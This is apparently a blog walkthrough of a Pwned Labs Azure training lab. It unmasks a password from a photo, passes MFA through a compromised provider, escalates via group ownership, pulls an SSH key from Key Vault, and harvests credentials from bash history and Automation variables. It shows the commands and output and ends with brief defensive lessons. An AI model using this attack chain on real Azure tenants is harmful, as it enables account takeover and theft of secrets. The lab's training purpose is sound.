---
title: Unlock Access with Azure Key Vault
description: Unlock Access with Azure Key Vault
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated. You are tasked with gaining initial access and demonstrating impact by increasing privileges.

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
We are given an image, which contains iPhone on the desk, which could indicate that iOS Markup was used to mask the Post-It. There's a [StackExchange page](https://security.stackexchange.com/a/198905), mentioning that using Markup's pencil or marker tools for redaction is unsafe as they are not fully opaque, even with the opacity slider set to its maximum. It contains link to a [9to5mac.com article](https://9to5mac.com/2018/03/13/ios-markup-reveal-redact-sensitive-info/) that shows how trivial it is to recover information underneath a iOS Markup redaction.

We can use any photo editor to do this, for example GIMP (GNU Image Manipulation Program). Open image in GIMP and from the `Colors` menu dropdown select `Brightness-Contract`. By adjusting the brightness and contract we can see the password `SUMMERDAZE1!`

![](unmask-privileged-access-in-azure-1.png)

This password could be for a personal service or for a work account. Based on recon it was found that Mega Big Tech use both `<firstname>@megabigtech.com` and `first.last@megabigtech.com` email formats. Run `az login` to try and get an Azure CLI session with the email `matteus@megabigtech.com` and the gained password `SUMMERDAZE1!`.

Mega Big Tech has unknowingly rolled out a compromised External Authentication Provider. As such, if a Microsoft App or TOTP MFA challenge appears, simply click `I can't use [this] right now`, and select the `mbt-eam` provider instead.

![](unmask-privileged-access-in-azure-2.png)

Select the subscription ID that start with `ceff`, in our case it's `1`
```
└─$ az login                                               
A web browser has been opened at https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize. Please continue the login in the web browser. If no web browser is available or if the web browser fails to open, use device code flow with `az login --use-device-code`.

Retrieving tenants and subscriptions for the selection...

[Tenant and subscription selection]

No     Subscription name            Subscription ID                       Tenant
-----  ---------------------------  ------------------------------------  -----------------
[1] *  Microsoft Azure Sponsorship  ceff06cb-e29d-4486-a3ae-eaaec5689f94  Default Directory

The default is marked with an *; the default tenant is 'Default Directory' and subscription is 'Microsoft Azure Sponsorship' (ceff06cb-e29d-4486-a3ae-eaaec5689f94).

Select a subscription and tenant (Type a number or Enter for no changes): 1

Tenant: Default Directory
Subscription: Microsoft Azure Sponsorship (ceff06cb-e29d-4486-a3ae-eaaec5689f94)

[Announcements]
With the new Azure CLI login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271236

If you encounter any problem, please open an issue at https://aka.ms/azclibug

[Warning] The login output has been updated. Please be aware that it no longer displays the full list of available subscriptions by default.
```

We got foothold in Mega Big Tech Azure environment. Let's gain situational awareness by running `az resource list`, which shows all resources that our current user has access to. We have access to a virtual machine named `AUTOMAT01` in the `mbt-rg-5 `resource group.
```
└─$ az resource list
[
  {
    "changedTime": "2023-11-30T17:17:51.364990+00:00",
    "createdTime": "2023-11-30T17:07:03.686020+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01",
    "identity": null,
    "kind": null,
    "location": "eastus",
    "managedBy": null,
    "name": "AUTOMAT01",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-5",
    "sku": null,
    "tags": null,
    "type": "Microsoft.Compute/virtualMachines",
    "zones": [
      "1"
    ]
  }
]
```

Let's get general information about the virtual machine
```
└─$ az vm show --resource-group mbt-rg-5 --name AUTOMAT01
{
  "additionalCapabilities": {
    "hibernationEnabled": false,
    "ultraSsdEnabled": null
  },
  "applicationProfile": null,
  "availabilitySet": null,
  "billingProfile": null,
  "capacityReservation": null,
  "diagnosticsProfile": null,
  "etag": "\"5945\"",
  "evictionPolicy": null,
  "extendedLocation": null,
  "extensionsTimeBudget": null,
  "hardwareProfile": {
    "vmSize": "Standard_B1ms",
    "vmSizeProperties": null
  },
  "host": null,
  "hostGroup": null,
  "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01",
  "identity": null,
  "instanceView": null,
  "licenseType": null,
  "location": "eastus",
  "managedBy": null,
  "name": "AUTOMAT01",
  "networkProfile": {
    "networkApiVersion": null,
    "networkInterfaceConfigurations": null,
    "networkInterfaces": [
      {
        "deleteOption": "Detach",
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1",
        "primary": null,
        "resourceGroup": "mbt-rg-5"
      }
    ]
  },
  "osProfile": {
    "adminPassword": null,
    "adminUsername": "automation",
    "allowExtensionOperations": true,
    "computerName": "AUTOMAT01",
    "customData": null,
    "linuxConfiguration": {
      "disablePasswordAuthentication": true,
      "enableVmAgentPlatformUpdates": false,
      "patchSettings": {
        "assessmentMode": "ImageDefault",
        "automaticByPlatformSettings": null,
        "patchMode": "ImageDefault"
      },
      "provisionVmAgent": true,
      "ssh": {
        "publicKeys": [
          {
            "keyData": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6mR2ZA1xLw4xONa+hQYoVGcmKMZtVU+WVQjREfDgHsDZSIjDrvXAPOQe9falxs3Wj14EjOzPyCtnq3teFrqUaUjiFohaZTdU5mKikVFhLyG8hHvTp1QEI9bBYOVSi2n3pUUKq16VgZwpPIWJscdRJcFiN03mhC1clZwu4T/p7lFFNlGW33SxNN7vaXA05lX2laF3UGTBjU5fzRJ4zzC1Nn5OEUwIyRKsGE6uy/rZxhr5qrjGpthL27KpssXKcg9tJgTBsMTwQWsBSLCjUjrJv1VCQKkGlY5UXRck24TdVSSYt7j/m6G702huC1DrDEtbjXSGWZ17MT1RRIqChsdUY2l3+g8TSPaHyrxkC4y6q8scUWVgrIcvUHqtAJhYmEyeRVtiJcKSerqKdwsyNuIUbflkc/l99n0Dr1cyj/LDRdxVzjSjWxKMRxPgWrZ/kQ9mC5PicXuLXlQTceiIlExT59UTaYFpHmpmnarE3yzCRdqHyMfdu3tmsTEp39vt+7i0= generated-by-azure",
            "path": "/home/automation/.ssh/authorized_keys"
          }
        ]
      }
    },
    "requireGuestProvisionSignal": true,
    "secrets": [],
    "windowsConfiguration": null
  },
  "placement": null,
  "plan": null,
  "platformFaultDomain": null,
  "priority": null,
  "provisioningState": "Succeeded",
  "proximityPlacementGroup": null,
  "resourceGroup": "mbt-rg-5",
  "resources": null,
  "scheduledEventsPolicy": null,
  "scheduledEventsProfile": null,
  "securityProfile": null,
  "storageProfile": {
    "alignRegionalDisksToVmZone": null,
    "dataDisks": [],
    "diskControllerType": "SCSI",
    "imageReference": {
      "communityGalleryImageId": null,
      "exactVersion": "20.04.202310250",
      "id": null,
      "offer": "0001-com-ubuntu-server-focal",
      "publisher": "canonical",
      "sharedGalleryImageId": null,
      "sku": "20_04-lts-gen2",
      "version": "latest"
    },
    "osDisk": {
      "caching": "ReadWrite",
      "createOption": "FromImage",
      "deleteOption": "Delete",
      "diffDiskSettings": null,
      "diskSizeGb": 30,
      "encryptionSettings": null,
      "image": null,
      "managedDisk": {
        "diskEncryptionSet": null,
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/disks/AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494",
        "resourceGroup": "mbt-rg-5",
        "securityProfile": null,
        "storageAccountType": "Standard_LRS"
      },
      "name": "AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494",
      "osType": "Linux",
      "vhd": null,
      "writeAcceleratorEnabled": null
    }
  },
  "tags": null,
  "timeCreated": "2023-11-30T17:07:03.721328+00:00",
  "type": "Microsoft.Compute/virtualMachines",
  "userData": null,
  "virtualMachineScaleSet": null,
  "vmId": "fc3e4e78-01a7-4cf2-a79c-1b897b6c951e",
  "zones": [
    "1"
  ]
}

```
It's a Ubuntu Linux machine, and the system user automation can `SSH` to it.

We can't get IP address of the VM
```
└─$ az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv
(AuthorizationFailed) The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials.                              
Code: AuthorizationFailed                                                                                                                                                                                                                   
Message: The client 'matteus@megabigtech.com' with object id '0dd32296-20f5-447c-b879-c57922db1ff0' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1' or the scope is invalid. If access was recently granted, please refresh your credentials.                                           
          
```

Let's use `roadrecon` to collect all Azure information related to current user
```
└─$ roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1!
Tokens were written to .roadtools_auth
```
```
└─$  roadrecon gather
Starting data gathering phase 1 of 2 (collecting objects)
Starting data gathering phase 2 of 2 (collecting properties and relationships)
ROADrecon gather executed in 19.46 seconds and issued 2123 HTTP requests.

```

Now we can visually examine the Azure environment
```
└─$ roadrecon gui
 * Serving Flask app 'roadtools.roadrecon.server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
```

![](unmask-privileged-access-in-azure-3.png)

We can click `Users` and search for current user. We see the `ObjectId 0dd32296-20f5-447c-b879-c57922db1ff0 `and the job title is `Azure Administrator (Level 1)`. No group membership but user has been assigned the `Directory Readers role` that allows them to read basic information from Entra ID.

![](unmask-privileged-access-in-azure-4.png)

![](unmask-privileged-access-in-azure-5.png)

`Owned objects` tab shows that we are an owner of the `DEVICE-ADMINS` group. This group allows desktop support to access resources and could help to move laterally and vertically within the environment.

![](unmask-privileged-access-in-azure-6.png)

`Raw` tab shows `ObjectID` of the `DEVICE-ADMINS` group is `aff1bca2-0c41-44e9-8e2c-8d6ca50fec45`

![](unmask-privileged-access-in-azure-7.png)

There are no members in the group, but since we are the owner, we can manage the group membership and add ourselves to the group

![](unmask-privileged-access-in-azure-8.png)

Let's do this from the command line using the PowerShell `Az` module. First let's get a session by running `Connect-AzAccount`. Just like before, if a Microsoft App or TOTP MFA challenge appears, simply click `I can't use [this] right now`, and select the `mbt-eam` provider instead.
```
└─PS> connect-AzAccount
Please select the account you want to login with.

Retrieving subscriptions for the selection...

[Announcements]
With the new Azure PowerShell login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271909.

If you encounter any problem, please open an issue at: https://aka.ms/azpsissue

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory
```

![](unmask-privileged-access-in-azure-9.png)


Now by using the ObjectID of our current user and the group we can run the following command to add ourselves as a member.
```
└─PS> Add-AzADGroupMember -TargetGroupObjectId aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 -MemberObjectId 0dd32296-20f5-447c-b879-c57922db1ff0
```

After running this command we need to refresh our session in order for any permissions associated with this group to take effect. 
```
> Disconnect-AzAccount
> az logout
> Connect-AzAccount
> az login
```

With new session, let's check our Azure role assignments
```
└─PS> Get-AzRoleAssignment

RoleAssignmentName : 8d80cde9-9605-4f0c-9cc8-bcc5b89eabe6
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01/providers/Microsoft.Authorization/roleAssignments/8d80cde9-9605-4f0c-9cc8-bcc5b89eab
                     e6
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01
DisplayName        : Matteus Lundgren
SignInName         : matteus@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 0dd32296-20f5-447c-b879-c57922db1ff0
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : d5bb7a4d-89bb-459c-ab88-8a2191c29516
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.KeyVault/vaults/Devices-new/providers/Microsoft.Authorization/roleAssignments/d5bb7a4d-89bb-459c-ab88-8a2191c29516
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.KeyVault/vaults/Devices-new
DisplayName        : DEVICE-ADMINS
SignInName         : 
RoleDefinitionName : Key Vault Secrets User
RoleDefinitionId   : 4633458b-17de-408a-b874-0445c86b69e6
ObjectId           : aff1bca2-0c41-44e9-8e2c-8d6ca50fec45
ObjectType         : Group
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : 05c24f87-1878-4d00-9238-d8d95bb9bfca
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.KeyVault/vaults/Devices-new/providers/Microsoft.Authorization/roleAssignments/05c24f87-1878-4d00-9238-d8d95bb9bfca
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.KeyVault/vaults/Devices-new
DisplayName        : DEVICE-ADMINS
SignInName         : 
RoleDefinitionName : Key Vault Reader
RoleDefinitionId   : 21090545-7ca7-4776-b22c-e363652d74d2
ObjectId           : aff1bca2-0c41-44e9-8e2c-8d6ca50fec45
ObjectType         : Group
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : fe65f870-f26c-4275-9873-84ce79506c5f
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1/providers/Microsoft.Authorization/roleAssignments/fe65f870-f26c-4275-9873-84
                     ce79506c5f
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1
DisplayName        : DEVICE-ADMINS
SignInName         : 
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : aff1bca2-0c41-44e9-8e2c-8d6ca50fec45
ObjectType         : Group
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : c5212f2b-5e68-4db4-95aa-599a338ce8f8
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/publicIPAddresses/AUTOMAT01-ip/providers/Microsoft.Authorization/roleAssignments/c5212f2b-5e68-4db4-95aa-599a3
                     38ce8f8
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/publicIPAddresses/AUTOMAT01-ip
DisplayName        : DEVICE-ADMINS
SignInName         : 
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : aff1bca2-0c41-44e9-8e2c-8d6ca50fec45
ObjectType         : Group
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : 71e56741-5fad-495e-95a2-629c8fd99555
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/MBT-RG-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01/providers/Microsoft.Authorization/roleAssignments/71e56741-5fad-495e-95a2-629c8fd995
                     55
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/MBT-RG-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01
DisplayName        : Lindsey Miller
SignInName         : Lindsey.Miller@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 61790ddd-f627-405d-8030-143e34400c21
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : 9bc3f091-0ac3-47f7-971b-b534f9f9c727
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1/providers/Microsoft.Authorization/roleAssignments/9bc3f091-0ac3-47f7-971b-b5
                     34f9f9c727
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1
DisplayName        : Lindsey Miller
SignInName         : Lindsey.Miller@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 61790ddd-f627-405d-8030-143e34400c21
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

RoleAssignmentName : bcfdde24-f920-4d8a-9a94-df370cf6b58e
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/publicIPAddresses/AUTOMAT01-ip/providers/Microsoft.Authorization/roleAssignments/bcfdde24-f920-4d8a-9a94-df370
                     cf6b58e
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/publicIPAddresses/AUTOMAT01-ip
DisplayName        : Lindsey Miller
SignInName         : Lindsey.Miller@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 61790ddd-f627-405d-8030-143e34400c21
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

```

The summary:
  - Matteus Lundgren:
    - The user has been assigned the `Reader` role restricted to the virtual machine named `AUTOMAT01` in the `mbt-rg-5` resource group. This was revealed previously with `Get-Resource` .
  - DEVICE-ADMINS Group:
    - The group has been given access to resources in the `mbt-rg-5` resource group:
      - Key Vault Access:
        - Members of this group can access secrets in the Key Vault named `Devices-new`. This allows them to handle sensitive information like passwords or encryption keys stored in this Key Vault.
      - Network Interface and Public IP Access:
        - Members of this group can access network information for the virtual machine `AUTOMAT01`.


Let's check out the Key Vault
```
└─PS> az keyvault secret list --vault-name Devices-new                                                                                                                                                                                      
[
  {
    "attributes": {
      "created": "2023-12-01T22:26:11+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2025-02-04T13:17:28+00:00"
    },
    "contentType": "User: automation",
    "id": "https://devices-new.vault.azure.net/secrets/AUTOMAT01",
    "managed": null,
    "name": "AUTOMAT01",
    "tags": {
      "file-encoding": "ascii"
    }
  }
]

```

We see a secret named `AUTOMAT01` that is stored in ASCII format, which is a SSH key
```
└─PS> az keyvault secret show --vault-name Devices-new --name AUTOMAT01                                                                                                                                                                     
{
  "attributes": {
    "created": "2023-12-01T22:26:11+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2025-02-04T13:17:28+00:00"
  },
  "contentType": "User: automation",
  "id": "https://devices-new.vault.azure.net/secrets/AUTOMAT01/80776fe595c64551a061e38de06eedab",
  "kid": null,
  "managed": null,
  "name": "AUTOMAT01",
  "tags": {
    "file-encoding": "ascii"
  },
  "value": "<REDACTED>"
}
```

Let's download it
```
└─$ az keyvault secret download --vault-name Devices-new --name AUTOMAT01 --file AUTOMAT01.pem
```
```
└─$ chmod 600 AUTOMAT01.pem 
```

Now retrieve the IP address of the virtual machine
```
└─$ az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv
13.68.147.240

```

And now got access to the VM
```
└─$ ssh -i AUTOMAT01.pem automation@13.68.147.240
The authenticity of host '13.68.147.240 (13.68.147.240)' can't be established.
ED25519 key fingerprint is SHA256:6GhdVGDYwkrfNkqprJC3ybwWOrbNuHwE7OxvJVvpWFo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '13.68.147.240' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1052-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 12 17:22:44 UTC 2025

  System load:  0.0                Processes:             104
  Usage of /:   23.4% of 28.89GB   Users logged in:       0
  Memory usage: 25%                IPv4 address for eth0: 10.1.0.4
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

1 device has a firmware upgrade available.
Run `fwupdmgr get-upgrades` for more information.


Expanded Security Maintenance for Applications is not enabled.

145 updates can be applied immediately.
101 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
automation@AUTOMAT01:~$ 

```

Enumeration shows `scripts` folder in home directory, but it's emptry
```
automation@AUTOMAT01:~$ id
uid=1000(automation) gid=1000(automation) groups=1000(automation)

```
```
automation@AUTOMAT01:~$ ls -lha
total 40K
drwxr-xr-x 6 automation automation 4.0K Dec  1  2023 .
drwxr-xr-x 6 root       root       4.0K Dec 30  2024 ..
-rw------- 1 automation automation  646 Dec  1  2023 .bash_history
-rw-r--r-- 1 automation automation  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 automation automation 3.7K Feb 25  2020 .bashrc
drwx------ 2 automation automation 4.0K Dec  1  2023 .cache
drwxrwxr-x 3 automation automation 4.0K Dec  1  2023 .local
-rw-rw-r-- 1 automation automation  814 Dec  1  2023 .profile
drwx------ 2 automation automation 4.0K Nov 30  2023 .ssh
-rw-r--r-- 1 automation automation    0 Dec  1  2023 .sudo_as_admin_successful
drwxr-xr-x 2 root       root       4.0K Dec  1  2023 scripts
```

Checking `.bash_history` shows Entra ID user's password
```
automation@AUTOMAT01:~$ cat .bash_history
ls -al
pwd
mkdir scripts
az group list
az login -u "serene@megabigtech.com" -p "<REDACTED>"
az group list
az vm list --resource-group migtest
az vm start --name mbttest1 --resource-group migtest
az storage account list
mkdir scripts
cd scripts
nano deploy_script.sh
chmod +x deploy_script.sh
./deploy_script.sh
rm deploy_script.sh
az network nsg list
az vm stop --name myVM --resource-group migtest
az vm deallocate --name myVM --resource-group migtest
az vm disk list --resource-group migtest --vm-name mbttest1
az vm delete --name mbttest1 --resource-group migtest --yes --no-wait
az group delete --name migtest --yes --no-wait
az logout
exit

```

Now login as `serene@megabigtech.com` just like we did before
```
> Disconnect-AzAccount
> Connect-AzAccount
```

New user has access to `automation-dev` Automation Account and a  `Schedule-VMStartStop` Runbook within the account.
```
└─PS> Get-AzResource

Name              : automation-dev/Schedule-VMStartStop
ResourceGroupName : mbt-rg-5
ResourceType      : Microsoft.Automation/automationAccounts/runbooks
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Automation/automationAccounts/automation-dev/runbooks/Schedule-VMStartStop
Tags              : 

Name              : automation-dev
ResourceGroupName : mbt-rg-5
ResourceType      : Microsoft.Automation/automationAccounts
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Automation/automationAccounts/automation-dev
Tags              : 

```

Azure [Automation Accounts](https://learn.microsoft.com/en-us/azure/automation/overview) is an Azure service that allows users to automate and orchestrate tasks using PowerShell and Python scripts. This automation gives us complete control during deployment, operations, and decommissioning of enterprise workloads and resources.

Runbooks in an Azure Automation Account are scripts that automate processes to manage resources and operations, reducing the need for manual intervention and ensuring consistent execution of tasks at cloud scale.

We can use the `Get-AzAutomationAccount` cmdlet to gather general information about the Automation Account, which shows that public access is enabled
```
└─PS> Get-AzAutomationAccount -ResourceGroupName "mbt-rg-5" -Name "automation-dev"                                                                                                                                                          

SubscriptionId        : ceff06cb-e29d-4486-a3ae-eaaec5689f94
ResourceGroupName     : mbt-rg-5
AutomationAccountName : automation-dev
Location              : eastus
State                 : Ok
Plan                  : Basic
CreationTime          : 12/1/2023 7:21:55 PM +06:00
LastModifiedTime      : 12/1/2023 7:21:55 PM +06:00
LastModifiedBy        : 
Tags                  : {}
Identity              : 
Encryption            : Microsoft.Azure.Management.Automation.Models.EncryptionProperties
PublicNetworkAccess   : True


```

Let's export the Runbook
```
└─PS> Export-AzAutomationRunbook -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" -Name Schedule-VMStartStop -Output .                                                                                                 

UnixMode         User Group         LastWriteTime         Size Name
--------         ---- -----         -------------         ---- ----
                                  9/13/2025 00:39              Schedule-VMStartStop.ps1

```

The script doesn't seem to be interesting from a security perspective and there are no hardcoded credentials or secrets
```
└─PS> cat ./Schedule-VMStartStop.ps1
param
(
    [Parameter(Mandatory=$true)]
    [string] $Action # Should be either 'Start' or 'Stop'
)

# Authenticate with Azure
$Conn = Get-AutomationConnection -Name AzureRunAsConnection
Connect-AzAccount -ServicePrincipal -TenantId $Conn.TenantId -ApplicationId $Conn.ApplicationId -CertificateThumbprint $Conn.CertificateThumbprint

# Fetch VMs based on tags
$VMsToProcess = Get-AzVM | Where-Object { ($_.Tags["AutoStart"] -eq "True" -and $Action -eq "Start") -or ($_.Tags["AutoStop"] -eq "True" -and $Action -eq "Stop") }

foreach ($VM in $VMsToProcess)
{
    if ($Action -eq "Start")
    {
        # Start the VM
        Start-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -ErrorAction Continue
    }
    elseif ($Action -eq "Stop")
    {
        # Stop the VM
        Stop-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -Force -ErrorAction Continue
    }
    else
    {
        Write-Output "Invalid Action Specified"
    }
}

Write-Output "Processed all VMs for action: $Action"

```
Let's continue our enumeration. It worth checking for credentials that are configured in the automation account. While it's not possible to access the plaintext password directly, they are made available to the Runbook. 
```
└─PS> Get-AzAutomationCredential -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | Format-Table Name, CreationTime, Description                                                                                       

Name             CreationTime                Description
----             ------------                -----------
automate-default 12/3/2023 9:21:16 PM +06:00 Default automation credential

```

If we had permissions to edit Runbook, we could've extract the credentials from the output. But we only have `Reader` accesss
```
└─PS> Get-AzRoleAssignment

RoleAssignmentName : 7e929cc1-6f95-44d4-8d0b-423ed6c15fa1
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Automation/automationAccounts/automation-dev/providers/Microsoft.Authorization/roleAssignments/7e929cc1-6f95-44d4-8d0b
                     -423ed6c15fa1
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Automation/automationAccounts/automation-dev
DisplayName        : Serene Hall
SignInName         : serene@megabigtech.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 78c5409e-1c5b-4ed6-85d6-cefd429cc5a6
ObjectType         : User
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 

```


Azure Automation also allows the use of variable assets, which are globally accessible variables that can be referenced from any runbooks in the automation account. Sensitive automation variables such as keys and passwords should be encrypted, but it seems in this case a sensitive variable was stored unencrypted.

```
└─PS> Get-AzAutomationVariable -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | fl Name, Value, Description                                                                                                          

Name        : Flag
Value       : <REDACTED>
Description : 

Name        : Password
Value       : <REDACTED>
              
              
Description : Password of the "automation" user (Note it has been assigned global admin permissions)

```

# Attack Path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](unmask-privileged-access-in-azure-10.png)

# Defense
This section is from [Walkthrough section](https://pwnedlabs.io/labs/unmask-privileged-access-in-azure) of the lab.

- Company employees freely share information on social media that red teams can use to create targeted pretexts for their phishing emails and lures and also in creating likely passwords. 
- Passing passwords on the command line as command line is a bad practice as command history may be stored in either Bash or PowerShell history files, and may also be caught in the Windows event log if command line argument logging is enabled. 
- There is no web browser available we can run `az login --use-device-code` to force device code authentication. 
